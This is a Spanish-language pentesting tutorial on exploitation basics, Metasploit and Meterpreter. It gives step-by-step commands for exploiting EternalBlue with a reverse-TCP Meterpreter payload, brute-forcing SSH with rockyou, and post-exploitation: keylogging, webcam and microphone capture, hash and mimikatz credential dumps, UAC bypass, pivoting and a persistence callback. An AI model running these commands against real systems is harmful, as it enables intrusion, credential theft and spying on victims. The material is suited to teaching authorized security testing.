# Fundamentos de Explotación

## ¿Qué es un Exploit?

```
Exploit = Código que aprovecha una vulnerabilidad

Componentes:
1. Vulnerabilidad (falla de seguridad)
2. Exploit (código para aprovecharla)
3. Payload (código que se ejecuta)

Flujo:
Vulnerabilidad → Exploit → Payload → Shell/Acceso
```

---

## Tipos de Exploits

### **Por Tipo de Acceso:**

```
Remote Exploits
• Explotan servicios de red
• No requieren acceso físico
• Ejemplo: EternalBlue (SMB)

Local Exploits
• Requieren acceso previo al sistema
• Usados para privilege escalation
• Ejemplo: Dirty COW (Linux)

Client-Side Exploits
• Explotan aplicaciones cliente
• Requieren interacción del usuario
• Ejemplo: Exploit de navegador
```

---

### **Por Método:**

```
Buffer Overflow
• Sobrescribir memoria
• Control de EIP/RIP

SQL Injection
• Inyección de código SQL

Command Injection
• Inyección de comandos OS

File Inclusion
• LFI, RFI

Deserialization
• Objetos maliciosos

Use-After-Free
• Punteros a memoria liberada
```

---

## Proceso de Explotación

```
1. RECONOCIMIENTO
   • Identificar objetivo
   • Enumerar servicios

2. ESCANEO
   • Nmap, Nessus
   • Identificar versiones

3. BÚSQUEDA DE EXPLOITS
   • Exploit-DB
   • GitHub
   • Metasploit modules

4. EXPLOTACIÓN
   • Ejecutar exploit
   • Obtener shell

5. POST-EXPLOTACIÓN
   • Privilege escalation
   • Persistencia
   • Lateral movement
```

---

## Búsqueda de Exploits

### **Exploit-DB**

```bash
# Web
https://exploit-db.com

# Búsqueda local (Kali)
searchsploit apache 2.4
searchsploit -t windows privilege
searchsploit -w 12345  # Por CVE
searchsploit -m 45010  # Copiar exploit

# Actualizar base de datos
searchsploit -u
```

---

### **CVE (Common Vulnerabilities and Exposures)**

```
CVE = Identificador único de vulnerabilidades

Formato: CVE-YYYY-NNNNN
Ejemplo: CVE-2017-0144 (EternalBlue)

Búsqueda:
• https://cve.mitre.org
• https://nvd.nist.gov
• https://cvedetails.com
```

---

### **GitHub**

```bash
# Buscar exploits en GitHub
site:github.com CVE-2021-44228
site:github.com "apache struts" exploit
```

---

# Metasploit Framework

## ¿Qué es Metasploit?

```
Framework de pentesting más usado del mundo

Componentes:
• msfconsole (interfaz principal)
• msfvenom (generador de payloads)
• msfdb (base de datos)
• Exploits (2000+)
• Payloads (500+)
• Auxiliary modules
• Post-exploitation modules
```

---

## Iniciar Metasploit

```bash
# Iniciar base de datos
sudo msfdb init

# Verificar estado de DB
sudo msfdb status

# Ejecutar Metasploit
msfconsole

# Banner
msf6 >
```

---

## Comandos Básicos de msfconsole

```bash
# Ayuda
help
help search

# Búsqueda
search apache
search type:exploit platform:windows
search cve:2017 rank:excellent

# Información de módulo
info exploit/windows/smb/ms17_010_eternalblue

# Usar módulo
use exploit/windows/smb/ms17_010_eternalblue

# Ver opciones
show options
show payloads
show targets

# Configurar opciones
set RHOSTS 192.168.1.100
set RHOST 10.10.10.10
set LHOST 192.168.1.50
set LPORT 4444

# Ver configuración actual
options

# Ejecutar exploit
run
exploit

# Trabajar con sesiones
sessions -l         # Listar sesiones
sessions -i 1       # Interactuar con sesión 1
sessions -k 1       # Matar sesión 1
sessions -K         # Matar todas

# Background de sesión
background
CTRL+Z

# Workspace (organización)
workspace -a proyecto1
workspace proyecto1
workspace -l

# Base de datos
hosts               # Hosts descubiertos
services            # Servicios
vulns               # Vulnerabilidades
db_nmap 192.168.1.0/24  # Nmap a DB

# Otros
back                # Volver
exit                # Salir
```

---

## Ejemplo: Explotación de EternalBlue

### **Vulnerabilidad: MS17-010**

```
CVE: CVE-2017-0144
Afecta: Windows 7, Windows Server 2008/2012
Servicio: SMB (puerto 445)
Impacto: Remote Code Execution
```

---

### **Paso 1: Escaneo**

```bash
# Nmap para detectar SMB
nmap -p445 --script smb-vuln-ms17-010 192.168.1.100

# Resultado si vulnerable:
# Host script results:
# | smb-vuln-ms17-010: 
# |   VULNERABLE:
```

---

### **Paso 2: Metasploit**

```bash
msfconsole

msf6 > search ms17-010

# Usar exploit
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# Ver opciones
msf6 exploit(ms17_010_eternalblue) > show options

# Configurar
msf6 exploit(ms17_010_eternalblue) > set RHOSTS 192.168.1.100
msf6 exploit(ms17_010_eternalblue) > set LHOST 192.168.1.50

# Verificar payload
msf6 exploit(ms17_010_eternalblue) > show payloads

# Payload por defecto: windows/x64/meterpreter/reverse_tcp

# Explotar
msf6 exploit(ms17_010_eternalblue) > run

# Si exitoso:
[*] Sending stage (200774 bytes) to 192.168.1.100
[*] Meterpreter session 1 opened

meterpreter >
```

---

## Módulos Importantes de Metasploit

### **Exploits Comunes**

```bash
# Windows
exploit/windows/smb/ms17_010_eternalblue  # EternalBlue
exploit/windows/smb/ms08_067_netapi       # MS08-067
exploit/windows/local/ms16_032_secondary_logon_handle_privesc

# Linux
exploit/linux/local/cve_2021_4034_pwnkit  # PwnKit
exploit/linux/local/cve_2022_0847_dirtypipe
exploit/multi/http/apache_mod_cgi_bash_env_exec  # Shellshock

# Web
exploit/multi/http/struts2_content_type_ognl
exploit/unix/webapp/drupal_drupalgeddon2
```

---

### **Auxiliary Modules (Escáner)**

```bash
# SMB
use auxiliary/scanner/smb/smb_version
use auxiliary/scanner/smb/smb_enumusers

# SSH
use auxiliary/scanner/ssh/ssh_login
use auxiliary/scanner/ssh/ssh_version

# HTTP
use auxiliary/scanner/http/http_version
use auxiliary/scanner/http/dir_scanner

# FTP
use auxiliary/scanner/ftp/ftp_version
use auxiliary/scanner/ftp/anonymous

# Database
use auxiliary/scanner/mysql/mysql_login
use auxiliary/scanner/postgres/postgres_login
```

---

## Ejemplo: SSH Brute Force

```bash
msfconsole

msf6 > use auxiliary/scanner/ssh/ssh_login

msf6 auxiliary(ssh_login) > set RHOSTS 192.168.1.100
msf6 auxiliary(ssh_login) > set USERNAME root
msf6 auxiliary(ssh_login) > set PASS_FILE /usr/share/wordlists/rockyou.txt
msf6 auxiliary(ssh_login) > set THREADS 10

msf6 auxiliary(ssh_login) > run

# Si encuentra credenciales:
[+] 192.168.1.100:22 - Success: 'root:password123'
[*] Command shell session 1 opened
```

---

# Meterpreter

## ¿Qué es Meterpreter?

```
Payload avanzado de Metasploit

Características:
• Totalmente en memoria (sin archivos en disco)
• Comunicación cifrada
• Módulos cargables dinámicamente
• Funciones de post-explotación
• Evasión de antivirus
```

---

## Comandos de Meterpreter

### **Información del Sistema**

```bash
# Sistema operativo
sysinfo

# Usuario actual
getuid

# Procesos
ps

# Interfaces de red
ipconfig
ifconfig

# Routing table
route

# Información de AV
run post/windows/gather/enum_av
```

---

### **Sistema de Archivos**

```bash
# Directorio actual
pwd
getwd

# Cambiar directorio
cd C:\Users\Administrator

# Listar archivos
ls
dir

# Descargar archivo
download C:\passwords.txt /root/

# Subir archivo
upload /root/payload.exe C:\Temp\

# Buscar archivos
search -f *.txt
search -f password* -d C:\Users

# Ejecutar archivo
execute -f cmd.exe -i

# Crear directorio
mkdir C:\Temp\test
```

---

### **Captura de Información**

```bash
# Screenshot
screenshot

# Keylogger
keyscan_start
keyscan_dump
keyscan_stop

# Webcam
webcam_list
webcam_snap
webcam_stream

# Micrófono
record_mic

# Clipboard
clipboard
```

---

### **Privilege Escalation**

```bash
# Ver privilegios
getprivs

# Intentar obtener SYSTEM
getsystem

# Técnicas de getsystem:
# 1. Named Pipe Impersonation
# 2. Token Duplication
# 3. Named Pipe Impersonation (RPCSS variant)

# Bypass UAC
run post/windows/escalate/bypassuac
```

---

### **Credenciales**

```bash
# Dump de hashes (requiere SYSTEM)
hashdump

# Dump de passwords con mimikatz
load kiwi
creds_all
kiwi_cmd sekurlsa::logonpasswords

# LSA secrets
lsa_dump_secrets
```

---

### **Pivoting y Port Forwarding**

```bash
# Agregar ruta
route add 10.10.10.0 255.255.255.0 1

# Port forwarding local
portfwd add -l 8080 -p 80 -r 10.10.10.100

# Listar port forwards
portfwd list

# Eliminar
portfwd delete -l 8080

# Autoroute
run autoroute -s 10.10.10.0/24
```

---

### **Sesiones y Persistencia**

```bash
# Background de sesión
background

# Migrar proceso (evasión)
ps
migrate <PID>

# Persistencia
run persistence -X -i 10 -p 4444 -r 192.168.1.50

# Shell del sistema
shell

# Volver a meterpreter
CTRL+Z

# Información de sesión
sessions -i 1
```